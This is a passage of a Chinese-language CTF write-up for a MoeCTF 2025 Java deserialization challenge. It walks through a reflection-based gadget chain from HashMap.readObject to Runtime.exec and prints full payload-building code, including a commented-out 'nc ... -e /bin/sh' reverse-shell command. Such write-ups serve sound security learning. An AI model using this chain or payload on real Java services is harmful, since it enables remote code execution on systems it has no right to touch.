class="string">&quot;w&quot;</span>))));</span><br></pre></td></tr></table></figure><br/><h1 id="MoeCTF-2025-第二十三章-幻境迷心·皇陨星沉-大结局"><a href="#MoeCTF-2025-第二十三章-幻境迷心·皇陨星沉-大结局" class="headerlink" title="[MoeCTF 2025]第二十三章 幻境迷心·皇陨星沉(大结局)"></a>[MoeCTF 2025]第二十三章 幻境迷心·皇陨星沉(大结局)</h1><p>一个月前看的反序列化题，那时候对Java都没有什么理解，最近感觉忘得差不多了就掏出来瞄一眼，发现很多之前难以理解的地方都清晰起来了</p><p>题目有用的无非就两个类<code>Dog</code>、<code>DogService</code>还有个<code>DogModel</code>接口</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.Dog;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>, DogModel &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String breed;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> hunger;</span><br><span class="line">    Object object;</span><br><span class="line">    String methodName;</span><br><span class="line">    Class[] paramTypes;</span><br><span class="line">    Object[] args;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Dog</span><span class="params">(<span class="type">int</span> id, String name, String breed, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.breed = breed;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.hunger = <span class="number">50</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getBreed</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.breed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHunger</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.hunger;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">feed</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.hunger = Math.max(<span class="number">0</span>, <span class="built_in">this</span>.hunger - <span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == o) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (o != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.getClass() == o.getClass()) &#123;</span><br><span class="line">            <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> (Dog)o;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.id == dog.id;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.wagTail(<span class="built_in">this</span>.object, <span class="built_in">this</span>.methodName, <span class="built_in">this</span>.paramTypes, <span class="built_in">this</span>.args);</span><br><span class="line">        <span class="keyword">return</span> Objects.hash(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="built_in">this</span>.id&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Dog里面有一些神秘的字段名<code>Object</code>、<code>args</code>什么的，很难不让人想到反射调用，而且注意到<code>Dog</code>中有个<code>hashCode()</code>方法，<code>hashCode()</code>内部调用了<code>wagTail()</code>，这个<code>wagTail()</code>在<code>DogModel</code>接口里面被定义为默认方法，具有方法体</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">default</span> Object <span class="title function_">wagTail</span><span class="params">(Object input, String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(methodName, paramTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, args);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法体中调用了反射，是一种可以执行一次命令的方法，但是还不足以进行命令执行，重点在<code>DogService</code>的<code>chainWagTail()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">chainWagTail</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">input</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(Dog dog : <span class="built_in">this</span>.dogs.values()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">                input = dog.object;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> dog.wagTail(input, dog.methodName, dog.paramTypes, dog.args);</span><br><span class="line">            input = result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> input;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>有点像CC链里面的<code>ChainedTransformer</code>了，通过链式调用获取<code>Runtime</code>实例执行命令，刚好DogService里面的<code>importBase64()</code>具有<code>readObject()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">importDogsBase64</span><span class="params">(String base64Data)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(base64Data))) &#123;</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">            <span class="type">Throwable</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">for</span>(example.demo.Dog.Dog dog : (Collection)ois.readObject()) &#123;</span><br><span class="line">                    dog.setId(<span class="built_in">this</span>.nextId++);</span><br><span class="line">                    <span class="built_in">this</span>.dogs.put(dog.getId(), dog);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var32) &#123;</span><br><span class="line">                var5 = var32;</span><br><span class="line">                <span class="keyword">throw</span> var32;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ois != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (var5 != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            ois.close();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Throwable var31) &#123;</span><br><span class="line">                            var5.addSuppressed(var31);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        ois.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | IOException e) &#123;</span><br><span class="line">            ((Exception)e).printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>好多try-catch看着很乱，现在问题是谁作为入口类？前面的<code>Dog</code>类具有<code>hashCode()</code>方法且可以反射调用命令，刚好<code>HashMap</code>的<code>readObject()</code>方法会自动调用<code>hash()</code>方法进而调用<code>hashCode()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        reinitialize();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                             mappings);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">            <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">            <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">            <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">            <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                       DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                       (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                       MAXIMUM_CAPACITY :</span><br><span class="line">                       tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">            <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                         (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">            <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">                Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">            table = tab;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>进入<code>hash()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>对键调用了<code>hashCode()</code>，构造一个map把一个<code>Dog</code>作为键，之后再通过反射调用<code>DogService</code>的<code>chainWagTail()</code>执行任意命令，链就完整了</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">   -&gt;HashMap.hash()</span><br><span class="line">       -&gt;example.demo.Dog.Dog.hashCode()</span><br><span class="line">       -&gt;example.demo.Dog.Dog.wagTail()</span><br><span class="line">           -&gt;method.invoke()</span><br><span class="line">               -&gt;example.demo.Dog.DogService.chainWagTail()</span><br><span class="line">               -&gt;example.demo.Dog.Dog.wagTail()</span><br><span class="line">               -&gt;example.demo.Dog.Dog.wagTail()</span><br><span class="line">               -&gt;example.demo.Dog.Dog.wagTail()</span><br><span class="line">                   dog1.Object -&gt; input = (Class) java.lang.Runtime</span><br><span class="line">                   dog2.wagtail(Runtime.class, &quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;) -&gt; input = (Method) java.lang.Runtime.getRuntime()</span><br><span class="line">                   dog3.wagtail(java.lang.Runtime.getRuntime(), &quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;) -&gt; input = (Runtime) Runtime</span><br><span class="line">                   dog4.wagTail(Runtime, &quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) -&gt; input = (ProcessImpl) Command executed</span><br></pre></td></tr></table></figure><p>首先就是要构造一个DogService，控制其dogs字段方便我们链式调用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Dog</span> <span class="variable">dog1</span> <span class="operator">=</span> setDogFields(Runtime.class,<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"><span class="type">Dog</span> <span class="variable">dog2</span> <span class="operator">=</span> setDogFields(<span class="literal">null</span>, <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;);</span><br><span class="line"><span class="type">Dog</span> <span class="variable">dog3</span> <span class="operator">=</span> setDogFields(<span class="literal">null</span>,<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">Map&lt;Integer, Dog&gt; map =  <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="number">1</span>,dog1);</span><br><span class="line">map.put(<span class="number">2</span>,dog2);</span><br><span class="line">map.put(<span class="number">3</span>,dog3);</span><br><span class="line"></span><br><span class="line"><span class="type">DogService</span> <span class="variable">dogService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DogService</span>();</span><br><span class="line">Class&lt;?&gt; clazz = DogService.class;</span><br><span class="line"><span class="type">Field</span> <span class="variable">dogs</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;dogs&quot;</span>);</span><br><span class="line">dogs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">dogs.set(dogService, map);</span><br></pre></td></tr></table></figure><p>噢，还要封装出来一个方法方便我们修改字段</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Dog <span class="title function_">setDogFields</span><span class="params">(Object object,String methodName,Class&lt;?&gt;[] paramTypes,Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="number">1</span>,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;bread&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = dog.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">objectField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        objectField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        objectField.set(dog,object);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">methodField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">        methodField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        methodField.set(dog,methodName);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">paramTypesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;paramTypes&quot;</span>);</span><br><span class="line">        paramTypesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        paramTypesField.set(dog,paramTypes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">argsField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;args&quot;</span>);</span><br><span class="line">        argsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        argsField.set(dog,args);</span><br><span class="line">        <span class="keyword">return</span> dog;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>构造一个<code>dog4</code>，让它去调用前面<code>dogService</code>的<code>chainWagTail()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Dog</span> <span class="variable">dog4</span> <span class="operator">=</span> setDogFields(dogService,<span class="string">&quot;chainWagTail&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">Map &lt;Dog, Integer&gt; invokeMap =  <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">invokeMap.put(dog4,<span class="number">114514</span>);</span><br></pre></td></tr></table></figure><p>或者用<code>HashSet</code>，因为<code>HashSet</code>的<code>readObject()</code>调用了<code>HashMap</code>的<code>put()</code>，而<code>put()</code>又调用了<code>hashCode()</code>，这么做的优点是<code>Set</code>接口是<code>Collection</code>的子接口，传进去的时候不会报转型错误</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Set&lt;Dog&gt; invokeSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">invokeSet.add(dog4);</span><br></pre></td></tr></table></figure><p>构造完毕，全链如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.Dog;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    HashMap.readObject()</span></span><br><span class="line"><span class="comment">    -&gt;HashMap.hash()</span></span><br><span class="line"><span class="comment">        -&gt;example.demo.Dog.Dog.hashCode()</span></span><br><span class="line"><span class="comment">        -&gt;example.demo.Dog.Dog.wagTail()</span></span><br><span class="line"><span class="comment">            -&gt;method.invoke()</span></span><br><span class="line"><span class="comment">                -&gt;example.demo.Dog.DogService.chainWagTail()</span></span><br><span class="line"><span class="comment">                -&gt;example.demo.Dog.Dog.wagTail()</span></span><br><span class="line"><span class="comment">                -&gt;example.demo.Dog.Dog.wagTail()</span></span><br><span class="line"><span class="comment">                -&gt;example.demo.Dog.Dog.wagTail()</span></span><br><span class="line"><span class="comment">                    dog1.Object -&gt; input = (Class) java.lang.Runtime</span></span><br><span class="line"><span class="comment">                    dog1.wagtail(Runtime.class, &quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;) -&gt; input = (Method) java.lang.Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                    dog2.wagtail(java.lang.Runtime.getRuntime(), &quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;) -&gt; input = (Runtime) Runtime</span></span><br><span class="line"><span class="comment">                    dog3.wagTail(Runtime, &quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;nc 127.0.0.1 4444 -e /bin/sh&quot;&#125;) -&gt; input = (ProcessImpl) Command executed</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable,Exception &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog1</span> <span class="operator">=</span> setDogFields(Runtime.class,<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog2</span> <span class="operator">=</span> setDogFields(<span class="literal">null</span>, <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;);</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog3</span> <span class="operator">=</span> setDogFields(<span class="literal">null</span>,<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//        Dog dog3 = setDogFields(null,&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;nc 127.0.0.1 4444 -e /bin/sh&quot;&#125;);</span></span><br><span class="line"></span><br><span class="line">        Map&lt;Integer, Dog&gt; map =  <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="number">1</span>,dog1);</span><br><span class="line">        map.put(<span class="number">2</span>,dog2);</span><br><span class="line">        map.put(<span class="number">3</span>,dog3);</span><br><span class="line"></span><br><span class="line">        <span class="type">DogService</span> <span class="variable">dogService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DogService</span>();</span><br><span class="line">        Class&lt;?&gt; clazz = DogService.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">dogs</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;dogs&quot;</span>);</span><br><span class="line">        dogs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        dogs.set(dogService, map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog4</span> <span class="operator">=</span> setDogFields(dogService,<span class="string">&quot;chainWagTail&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        Map &lt;Dog, Integer&gt; invokeMap =  <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        invokeMap.put(dog4,<span class="number">114514</span>);</span><br><span class="line"></span><br><span class="line">        serialize(invokeMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;moeSerial.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Dog <span class="title function_">setDogFields</span><span class="params">(Object object,String methodName,Class&lt;?&gt;[] paramTypes,Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="number">1</span>,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;bread&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        Class&lt;?&gt; clazz = dog.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">objectField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        objectField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        objectField.set(dog,object);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">methodField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">        methodField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        methodField.set(dog,methodName);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">paramTypesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;paramTypes&quot;</span>);</span><br><span class="line">        paramTypesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        paramTypesField.set(dog,paramTypes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">argsField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;args&quot;</span>);</span><br><span class="line">        argsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        argsField.set(dog,args);</span><br><span class="line">        <span class="keyword">return</span> dog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;moeSerial.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">        <span class="type">byte</span>[] fileBytes = Files.readAllBytes(Paths.get(<span class="string">&quot;moeSerial.ser&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Encoded</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(fileBytes);</span><br><span class="line">        System.out.println(base64Encoded);</span><br><span class="line">        Files.write(Paths.get(<span class="string">&quot;moeSerial.txt&quot;</span>), base64Encoded.getBytes());</span><br><span class="line">    &#125;</span><br><span 